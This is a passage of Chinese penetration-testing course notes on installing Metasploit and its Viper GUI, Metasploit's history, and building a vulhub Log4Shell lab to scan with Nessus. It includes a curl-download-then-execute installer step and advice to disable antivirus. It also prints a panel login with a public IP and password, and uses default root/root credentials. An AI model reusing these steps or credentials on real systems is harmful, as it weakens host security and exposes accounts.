headers)”的报错，这里的解决方案是<strong>修改DNS服务</strong>。具体操作如下：</p><p><code>vim /etc/resolv.conf</code></p><p><strong>将dns修改为8.8.8.8</strong>，</p><p>即将 nameserver 后面的DNS地址改为<code>8.8.8.8</code></p><p>重启docker 服务</p><p><code>systemctl restart docker</code></p><p>然后进入到安装目录，$VIPER_DIR表示你的安装viper的目录</p><p><code>cd $VIPER_DIR</code></p><p>然后执行</p><p><code>docker-compose up -d</code><br>顺利启动</p></blockquote><p><img src="MSF%E5%9B%BE%E5%BD%A2%E7%95%8C%E9%9D%A2Viper.assets/1640043509764.png" alt="1640043509764"></p><p>**等待15s系统启动,访问炫彩蛇 **</p><ul><li><code>https://192.168.70.3:60000</code></li><li>登录. 用户名:root </li><li>密码: root</li></ul><p><img src="MSF%E5%9B%BE%E5%BD%A2%E7%95%8C%E9%9D%A2Viper.assets/1640043540568.png" alt="1640043540568"></p><p><strong>注意：</strong></p><p><strong>所有的docker-compose命令必须在安装目录执行才会有效果</strong></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2022/12/25/penetration-test-learning/part-2-infiltration-and-defense/25msf-cobalt-strike/04-windows-an-zhuang-msf/"/>
      <url>/2022/12/25/penetration-test-learning/part-2-infiltration-and-defense/25msf-cobalt-strike/04-windows-an-zhuang-msf/</url>
      
        <content type="html"><![CDATA[<h1 id="1-下载metasploit"><a href="#1-下载metasploit" class="headerlink" title="1  下载metasploit"></a>1  下载metasploit</h1><p> 首先咱们进入metasploit官网</p><p><a href="https://www.metasploit.com/">https://www.metasploit.com/</a></p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1985/1639970354000/de0dfa24cf144e319e9817208d796e67.png" alt="image.png"></p><p>点击 Download  下载</p><p>或者直接访问这个 地址</p><p><a href="https://www.metasploit.com/download">https://www.metasploit.com/download</a></p><p>进入这个页面  点击 Metasploit Framework  下面的 Download</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1985/1639970354000/40c70142eedd4ee7b6a132a84426dd1f.png" alt="image.png"></p><p>会访问这个地址</p><p><a href="https://github.com/rapid7/metasploit-framework/wiki/Nightly-Installers">https://github.com/rapid7/metasploit-framework/wiki/Nightly-Installers</a></p><p>如果你不能打开GitHub 我们可以通过镜像服务器 访问</p><p><a href="https://hub.fastgit.org/rapid7/metasploit-framework/wiki/Nightly-Installers">https://hub.fastgit.org/rapid7/metasploit-framework/wiki/Nightly-Installers</a></p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1985/1639970354000/a6096a53fc0f411fa7d4a1ecb32bea1a.png" alt="image.png"></p><p>这边给大家提供更多的国内可用镜像</p><p>#官网镜像（可以用来clone push等,但是不能登录）</p><p><a href="https://github.com.cnpmjs.org/">https://github.com.cnpmjs.org/</a><br><a href="https://git.sdut.me/">https://git.sdut.me/</a></p><p>#github常用的镜像</p><p><a href="https://hub.fastgit.org/">https://hub.fastgit.org</a></p><p><a href="https://git.sdut.me/">https://git.sdut.me/</a></p><p><a href="http://github-mirror.bugkiller.org/">http://github-mirror.bugkiller.org/</a><br>#api镜像<br><a href="https://api.git.sdut.me/">https://api.git.sdut.me/</a></p><p>然后找到Windows版本的下载</p><p>点击 latest Windows installer 下载  最新版本</p><p>点击  view older builds   下载历史版本</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1985/1639970354000/cd3b851b93854b55b549028fa9fb61f9.png" alt="image.png"></p><h1 id="2-安装metasploit并配置环境变量"><a href="#2-安装metasploit并配置环境变量" class="headerlink" title="2 安装metasploit并配置环境变量"></a>2 安装metasploit并配置环境变量</h1><p>安装前关闭win自带的杀毒 和卸载第三方杀毒</p><p>添加环境变量</p><p>C:\metasploit-framework\bin</p><h1 id="3-启动并使用"><a href="#3-启动并使用" class="headerlink" title="3 启动并使用"></a>3 启动并使用</h1><p>首次启动 需要初始化数据库</p><p>终端中输入 msfdb init</p><p>启动MSF框架</p><p>终端中输入 msfconsole</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2022/12/25/penetration-test-learning/part-2-infiltration-and-defense/25msf-cobalt-strike/03-kali-geng-xin-msf/"/>
      <url>/2022/12/25/penetration-test-learning/part-2-infiltration-and-defense/25msf-cobalt-strike/03-kali-geng-xin-msf/</url>
      
        <content type="html"><![CDATA[<p>登录kali</p><h1 id="1-打开终端获取root权限"><a href="#1-打开终端获取root权限" class="headerlink" title="1 打开终端获取root权限"></a>1 打开终端获取root权限</h1><pre class="line-numbers language-none"><code class="language-none">获取root权限 可以在终端 输入 sudo su  然后输入登录密码获取root权限<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h1 id="2-开始更新"><a href="#2-开始更新" class="headerlink" title="2 开始更新"></a>2 开始更新</h1><h2 id="换国内源"><a href="#换国内源" class="headerlink" title="换国内源"></a>换国内源</h2><p>首先先添加更新源</p><p>进入 etc/apt/   目录</p><p>打开 sources.list   需要使用root权限执行</p><p><code>vim /etc/apt/sources.list</code></p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1985/1639970340000/777269e6dc9143718ac9080d4650d0c7.png" alt="image.png"></p><pre class="line-numbers language-none"><code class="language-none">#中科大源deb http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib deb-src http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib #阿里云kali更新源deb http://mirrors.aliyun.com/kali kali-rolling main non-free contrib deb-src http://mirrors.aliyun.com/kali kali-rolling main non-free contrib#清华大学源deb http://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-freedeb-src https://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-free#浙大源deb http://mirrors.zju.edu.cn/kali kali-rolling main contrib non-freedeb-src http://mirrors.zju.edu.cn/kali kali-rolling main contrib non-free#东软大学源deb http://mirrors.neusoft.edu.cn/kali kali-rolling/main non-free contribdeb-src http://mirrors.neusoft.edu.cn/kali kali-rolling/main non-free contrib#网易Kali源 deb http://mirrors.163.com/debian wheezy main non-free contrib deb-src http://mirrors.163.com/debian wheezy main non-free contrib deb<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>​     </p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1985/1639970340000/c9eeca42087541a09f20a8078d8064c7.png" alt="image.png"></p><h2 id="更新软件列表"><a href="#更新软件列表" class="headerlink" title="更新软件列表"></a>更新软件列表</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">apt-get</span> update  <span class="token comment">#更新软件列表</span><span class="token function">apt-get</span> upgrade  <span class="token comment">#更新软件</span><span class="token function">apt-get</span> dist-upgrade  <span class="token comment">#升级</span><span class="token function">apt-get</span> clean  <span class="token comment">#删除缓存包</span><span class="token function">apt-get</span> autoclean  <span class="token comment">#删除未安装的deb包</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="更新metasploit"><a href="#更新metasploit" class="headerlink" title="更新metasploit"></a>更新metasploit</h2><p><code>apt-get install metasploit-framework</code></p><h1 id="3-如果更新时显示update无效的错误！"><a href="#3-如果更新时显示update无效的错误！" class="headerlink" title="3 如果更新时显示update无效的错误！"></a>3 如果更新时显示update无效的错误！</h1><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1985/1639970340000/dea81b359ad14271b35fbc7db0609126.png" alt="image.png"></p><p>输入下面几个命令修复</p><pre class="line-numbers language-none"><code class="language-none">wget -q -O - https://archive.kali.org/archive-key.asc | apt-key add apt-get clean apt-get update<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>4 如果报：E: Unmet dependencies. Try ‘apt –fix-broken install’ with no packages (or specify a solution).</p><p><code>apt --fix-broken install</code>             </p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2022/12/25/penetration-test-learning/part-2-infiltration-and-defense/25msf-cobalt-strike/02-linux-an-zhuang-msf/"/>
      <url>/2022/12/25/penetration-test-learning/part-2-infiltration-and-defense/25msf-cobalt-strike/02-linux-an-zhuang-msf/</url>
      
        <content type="html"><![CDATA[<p><strong>1 乌班图安装MSF</strong></p><p><strong>环境准备：</strong></p><p>vm虚拟机 </p><p>Ubuntu桌面版镜像 </p><p>打开终端  输入 sudo su  获取root权限 </p><p>然后输入命令</p><pre class="line-numbers language-none"><code class="language-none">curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb &gt; msfinstall<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>然后赋755权限 并执行安装</p><pre class="line-numbers language-none"><code class="language-none">chmod 755 msfinstall &amp;&amp; ./msfinstall<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>2 直接安装kali系统</strong></p><p>第一种vm虚拟机 kali </p><p>第二种 iso安装镜像</p><p>首先咱们进入kali官网下载kali</p><p><a href="https://www.kali.org/get-kali/#kali-bare-metal">https://www.kali.org/get-kali/#kali-bare-metal</a>  选择安装版镜像</p><p>![1639993881805](02 Linux安装msf.assets/1639993881805.png)</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2022/12/25/penetration-test-learning/part-2-infiltration-and-defense/25msf-cobalt-strike/01-msf-fa-zhan-shi/"/>
      <url>/2022/12/25/penetration-test-learning/part-2-infiltration-and-defense/25msf-cobalt-strike/01-msf-fa-zhan-shi/</url>
      
        <content type="html"><![CDATA[<h1 id="1-Metasploit-发展史"><a href="#1-Metasploit-发展史" class="headerlink" title="1 Metasploit-发展史"></a>1 Metasploit-发展史</h1><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1985/1639966573000/418450a2cc3143c2bb296f73eccb131d.png" alt="image.png"></p><p>Metasploit框架使Metasploit具有良好的可扩展性，它的控制接口负责发现漏洞、攻击漏洞，提交漏洞，然后通过一些接口加入攻击后处理工具和报表工具。Metasploit框架可以从一个漏洞扫描程序导入数据，使用关于有漏洞主机的详细信息来发现可攻击漏洞，然后使用有效载荷对系统发起攻击，有效载荷就是在发现漏洞之后开发一种可行的攻击方法。其用于提取本地系统密码、安装其他软件或控制硬件等的模块，这些功能很像以前BO2K等工具所具备的功能。</p><h2 id="2004年"><a href="#2004年" class="headerlink" title="2004年"></a>2004年</h2><p>2004年8月，在拉斯维加斯开了一次世界黑客交流会–叫黑帽简报（Black Hat Briefings). 在这个会议上，一款叫Metasploit 的攻击和渗透工具备受众黑客关注，出尽了风头。 Metasploit 是同 HD Moore 和 Spoonm等4名年轻人开发的，这款免费软件可以帮助黑客攻击和控制计算机，安全人员也可以利用 Metasploit 来加强系统对此类工具的攻击。Metasploit 的演示吸引了来自“美国国防部”和“国家安全局”等政府机构的众多安全顾问和个人，正如 Spoonm 在演讲中所说的, Metasploit 很简单，只需要求“找到目标，单击和控制”即可。 2004年 Metasploit 的发布在安全界引发了强烈的“地震”。</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1985/1639966573000/a3d942aff8ef42949af2523afdc7fb00.png" alt="image.png"></p><h2 id="2005年"><a href="#2005年" class="headerlink" title="2005年"></a>2005年</h2><p>2005年6月，西雅图效区的微软公司总部园区内的管理情报中心，开了一次“蓝帽”会议。几百名微软公司的工程师和众多外界专家及黑客都被邀请进入微软帝国的中心。在会议中的黑客攻击演示中，当 Moore 向系统程序员们说明使用 Metasploit 测试系统对抗入侵的可靠程度时，Metasploit 让微软公司的开发人员再次感到不安。在程序员们看来，Metasploit 将会使系统安全面临严重的考验。 Metasploit (MSF) 在2003年以开放源码方式发布，是可以自由获取的开发框架。它是一个强大的开源平台，提供开发，测试和使用恶意代码，这个环境为渗透测试，为shellcode 编写和漏洞研究提供了一个可靠平台。 Metasploit框架直到2006年发布的2.7版本都用Perl脚本语言编写，由于Perl的一些缺陷，开发者于2007年底使用Ruby语言重写了该框架。到2007年年底，Spoonm和马特·米勒已经离开了项目。从2008年发布的3.2版本开始，该项目采用新的3段式BSD许可证。</p><h2 id="2009年"><a href="#2009年" class="headerlink" title="2009年"></a>2009年</h2><p>2009年10月21号，漏洞管理解决公司Rapid7收购Metasploit项目。Rapid7承诺成立专职开发团队，仍然将源代码置于3段式BSD许可证下。</p><h1 id="2-BSD许可证"><a href="#2-BSD许可证" class="headerlink" title="2 BSD许可证"></a>2 BSD许可证</h1><p>相较于GPL许可证和MPL许可证的严格性，BSD许可证就宽松许多了，一样是只需要附上许可证的原文，不过比较有趣的是，它还要求所有进一步开发者将自己的版权资料放上去，所以拿到以BSD许可证发行的软件可能会遇到一个小状况，就是这些版权资料许可证占的空间比程序还大。</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1985/1639966573000/9bc54e5da27644769e8c59836a95aa0c.png" alt="image.png"></p><h1 id="3-Metasploit发展前景"><a href="#3-Metasploit发展前景" class="headerlink" title="3 Metasploit发展前景"></a>3 Metasploit发展前景</h1><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1985/1639966573000/53ecab99591140878359777a3039a423.png" alt="image.png"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2022/12/25/penetration-test-learning/part-2-infiltration-and-defense/24nessus-lou-dong-sao-miao/di-5-jie-nessus-sao-miao-log4j-lou-dong/"/>
      <url>/2022/12/25/penetration-test-learning/part-2-infiltration-and-defense/24nessus-lou-dong-sao-miao/di-5-jie-nessus-sao-miao-log4j-lou-dong/</url>
      
        <content type="html"><![CDATA[<h1 id="Nessus-扫描log4J漏洞"><a href="#Nessus-扫描log4J漏洞" class="headerlink" title="Nessus 扫描log4J漏洞"></a>Nessus 扫描log4J漏洞</h1><h2 id="1-扫描环境搭建"><a href="#1-扫描环境搭建" class="headerlink" title="1.扫描环境搭建"></a>1.扫描环境搭建</h2><h5 id="1-centos7-安装装宝塔面板"><a href="#1-centos7-安装装宝塔面板" class="headerlink" title="1.centos7 安装装宝塔面板"></a>1.centos7 安装装宝塔面板</h5><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1648296056045/0441e1bbb16a4097a848d126df6ad17a.png" alt="image.png"></p><p><img src="assets/image-20221211213741692.png" alt="image-20221211213741692"></p><pre class="line-numbers language-none"><code class="language-none">外网面板地址: http://61.157.69.124:8888/3bcd8840内网面板地址: http://192.168.70.10:8888/3bcd8840username: lo3xkp7ipassword: 0f947aea<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h5 id="2-面板里下载docker"><a href="#2-面板里下载docker" class="headerlink" title="2.面板里下载docker"></a>2.面板里下载docker</h5><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1648296056045/de849a33389c490bb17d0eac6a96fecb.png" alt="image.png"></p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1648296056045/519f4443f1814959b11df6d88aac4145.png" alt="image.png"></p><h5 id="3-进入centos检查docker是否生效"><a href="#3-进入centos检查docker是否生效" class="headerlink" title="3.进入centos检查docker是否生效"></a>3.进入centos检查docker是否生效</h5><pre class="line-numbers language-none"><code class="language-none">docker --version<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h5 id="4-安装docker-compose"><a href="#4-安装docker-compose" class="headerlink" title="4.安装docker-compose"></a>4.安装docker-compose</h5><p>Docker Compose是一个用来定义和运行复杂应用的Docker工具。一个使用Docker容器的应用，通常由多个容器组成。使用Docker Compose不再需要使用shell脚本来启动容器。</p><p>Compose 通过一个配置文件来管理多个Docker容器，在配置文件中，所有的容器通过services来定义，然后使用docker-compose脚本来启动，停止和重启应用，和应用中的服务以及所有依赖服务的容器，非常适合组合使用多个容器进行开发的场景。</p><p>参考：<a href="https://docs.docker.com/compose/install/">https://docs.docker.com/compose/install/</a></p><p>4.1 下载 docker-compose</p><pre class="line-numbers language-none"><code class="language-none">curl -L "https://github.com/docker/compose/releases/download/1.29.2/docker-compose-$(uname -s)-$(uname -m)" -o /usr/local/bin/docker-compose<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1648296056045/021b03ca8c80487f9195adc1109febbd.png" alt="image.png"></p><p>4.2 查看docker-compose</p><pre class="line-numbers language-none"><code class="language-none">ls /usr/local/bin/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1648296056045/07d926dcfd0d42d99b24743b674def58.png" alt="image.png"></p><p>4.3 给docker-compose目录增加可执行权限</p><pre class="line-numbers language-none"><code class="language-none">chmod +x /usr/local/bin/docker-composels /usr/local/bin/<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1648296056045/1a52eca9ba98451e9944261df831b9e1.png" alt="image.png"></p><p>4.4 查看版本</p><pre class="line-numbers language-none"><code class="language-none">docker-compose -version<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1648296056045/2e178bf8083d40e8a8a2a4626dce321a.png" alt="image.png"></p><h5 id="5-安装vulhub"><a href="#5-安装vulhub" class="headerlink" title="5.安装vulhub"></a>5.安装vulhub</h5><p>5.1 创建zsoft文件夹</p><pre class="line-numbers language-none"><code class="language-none">cd /www/wwwroot/lsmkdir softslscd softs<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1648296056045/100e72d253494a77865a0ef28e3853e0.png" alt="image.png"></p><p>5.2 下载 vulhub,并查看</p><pre class="line-numbers language-none"><code class="language-none">git clone https://github.com/vulhub/vulhub.gitlscd vulhubls<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1648296056045/f07e9e024a4845c3b9b041e2e551536d.png" alt="image.png"></p><h5 id="6-部署log4J靶场"><a href="#6-部署log4J靶场" class="headerlink" title="6.部署log4J靶场"></a>6.部署log4J靶场</h5><p>6.1 进入log4j/CVE-2021-44228</p><pre class="line-numbers language-none"><code class="language-none">cd log4j/CVE-2021-44228ls<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1648296056045/dac22ab5392b42ceb89fdb2d04f1f6cf.png" alt="image.png"></p><p>6.2 编译环境</p><pre class="line-numbers language-none"><code class="language-none">docker-compose build<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1648296056045/8826d479399247d19cac4368b5584a13.png" alt="image.png"></p><p>6.3 运行环境</p><pre class="line-numbers language-none"><code class="language-none">docker-compose up -ddocker-compose down //关闭环境<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>6.4 查看端口</p><pre class="line-numbers language-none"><code class="language-none">docker-compose psdocker ps<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1648296056045/99dbccec16e8460cb65771e03b010197.png" alt="image.png"></p><p>6.5 查看ip</p><pre class="line-numbers language-none"><code class="language-none">ip a<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1648296056045/b864d9f810564857a93c5eb342240344.png" alt="image.png"></p><p>6.6 宝塔面板放行端口</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1648296056045/5398f901945340fb9f0531283655dd15.png" alt="image.png"></p><p>6.7 访问靶场地址</p><pre class="line-numbers language-none"><code class="language-none">http://192.168.70.10:8983<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1648296056045/f19a24723ea74f90bfbd516c97ac17fc.png" alt="image.png"></p><h2 id="2-扫描log4J漏洞"><a href="#2-扫描log4J漏洞" class="headerlink" title="2.扫描log4J漏洞"></a>2.扫描log4J漏洞</h2><h3 id="1-log4Jshell扫描"><a href="#1-log4Jshell扫描" class="headerlink" title="1.log4Jshell扫描"></a>1.log4Jshell扫描</h3><p>1.访问nessus扫描网站</p><pre class="line-numbers language-none"><code class="language-none">https://192.168.70.3:8834/#/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1648296056045/5312ef585b90494393ac1c3836733512.png" alt="image.png"></p><p>2.登录后，点击【新增扫描】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1648296056045/d7b219844c3d4be4a870a9172bd1a0c8.png" alt="image.png"></p><p>3.选择【Log4Shell】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1648296056045/879dab939e1948fe88055cce194c4472.png" alt="image.png"></p><p>4.输入Name【log4jshell】，目标【192.168.110.198】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1648296056045/2c9bafcb837e4b10acdfe1796110af16.png" alt="image.png"></p><p>5.点击【发现】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1648296056045/54e3442117ad4a51808430dcd3d9004a.png" alt="image.png"></p><p>6.选择扫描类型【彻底】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1648296056045/27cc3ab79bf54b9da3af319a2d8ed9ff.png" alt="image.png"></p><p>7.点击【评估】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1648296056045/249465aabe16419b9480bc51108f7922.png" alt="image.png"></p><p>8.选择扫描类型【默认】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1648296056045/1be69e69dc224a41bab404c4918e0e4f.png" alt="image.png"></p><p>9.点击【证书】,点击【ssh】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1648296056045/e39419bb80074bfc9a6f0173912c924d.png" alt="image.png"></p><p>10.选择身份验证方法【密码】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1648296056045/ae7649df348d424397281fcfb273e6d0.png" alt="image.png"></p><p>11.输入被扫描服务器的用户名【root】，密码【root】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1648296056045/20a706aa71c149f988c2bd3a0a8c91d1.png" alt="image.png"></p><p>12.点击【插件】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1648296056045/d55fa35e69ea42768a03f1513c35f1ef.png" alt="image.png"></p><p>13.点击【保存】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1648296056045/f9ea1593922343a58b2ce767e674cdf0.png" alt="image.png"></p><p>14.执行【log4shell】扫描</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1648296056045/d7721cd40f2d4817b55c50dccb64b0b5.png" alt="image.png"></p><p>15.查看log4J的扫描结果</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1648296056045/366adf34bbb8440ba60b270fdcf51d87.png" alt="image.png"></p><h3 id="2-nesuss扫描Log4Shell-漏洞生态系统"><a href="#2-nesuss扫描Log4Shell-漏洞生态系统" class="headerlink" title="2.nesuss扫描Log4Shell 漏洞生态系统"></a>2.nesuss扫描Log4Shell 漏洞生态系统</h3><p>1.访问nessus扫描网站</p><p><a href="https://192.168.70.3:8834/#/">https://192.168.70.3:8834/#/</a></p><p>2.点击新建扫描</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1648296056045/3e85bf0e4380479b8df37afeb85973e5.png" alt="image.png"></p><p>3.选择【Log4Shell 漏洞生态系统】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1648296056045/24fc6288d71340efae4d97bd5ad9f870.png" alt="image.png"></p><p>4.输入Name【log4jshell 生态】，目标【192.168.110.198】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1648296056045/5fe55d20097c458db27204caad1b22af.png" alt="image.png"></p><p>5.点击【发现】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1648296056045/5b8e5e6b086742fe85a816475ef782bc.png" alt="image.png"></p><p>6.选择扫描类型【彻底】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1648296056045/525da2c8e3684e69a3e7ebde40302d61.png" alt="image.png"></p><p>7.点击【评估】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1648296056045/99012fc379dd4e27aec5c0a4e3f2c1f8.png" alt="image.png"></p><p>8.选择扫描类型【默认】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1648296056045/4ea0cce3414643abb0cce510e0b882b4.png" alt="image.png"></p><p>9.点击【证书】,点击【ssh】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1648296056045/7c20e6d3e7824e95ba02c85bc7722628.png" alt="image.png"></p><p>10.点击【插件】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1648296056045/741be19fc5044b4c84da53ecdf6bab9f.png" alt="image.png"></p><p>11.点击【保存】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1648296056045/5e45a982324f4b14a7c17e016f0c5b9f.png" alt="image.png"></p><p>12.执行【log4shell 生态】扫描</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1648296056045/fc08c461762b4f96aa936946747c4e05.png" alt="image.png"></p><p>13.查看log4J 生态的扫描结果</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1648296056045/3192b68ad96e4e9aaaff70e36b057477.png" alt="image.png"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2022/12/25/penetration-test-learning/part-2-infiltration-and-defense/24nessus-lou-dong-sao-miao/di-4-jie-nessus-sao-miao-web-fu-wu/"/>
      <url>/2022/12/25/penetration-test-learning/part-2-infiltration-and-defense/24nessus-lou-dong-sao-miao/di-4-jie-nessus-sao-miao-web-fu-wu/</url>
      
        <content type="html"><![CDATA[<h1 id="Nessus-扫描web服务"><a href="#Nessus-扫描web服务" class="headerlink" title="Nessus 扫描web服务"></a>Nessus 扫描web服务</h1><p>1.启动nessus</p><pre class="line-numbers language-none"><code class="language-none">cd nessussh qd_nessus.sh<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>2.进入nessus网站</p><pre class="line-numbers language-none"><code class="language-none">https://192.168.3.47:8834/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>3.点击【New Scan】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1648021164050/55304735fe8946f6a0ced005bc35c64a.png" alt="image.png"></p><p>4.点击【Web应用程序测试】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1648021164050/e9d95f4061d6499c823cb51e7879ebe6.png" alt="image.png"></p><p>5.输入name【web扫描】，描述【web扫描】，目标【127.0.0.1】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1648021164050/50c7f3ab84c44ee0b6fe81e3b8a30f4c.png" alt="image.png"></p><p>6.点击【发现】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1648021164050/49f9bad581cb40dea6ed3abae5c95cd5.png" alt="image.png"></p><p>7.选择扫描类型【端口扫描(常用端口)】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1648021164050/c1e34fee97b0485dad86f8df929e5430.png" alt="image.png"></p><p>8.点击【评估】</p><p><img src="https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1648021164050/4ea7b2375b8c41349514308597c351e2.png" alt="image.png"></p><p>9.扫描类型选择【扫描所有web漏洞(快速)】</p><p><img 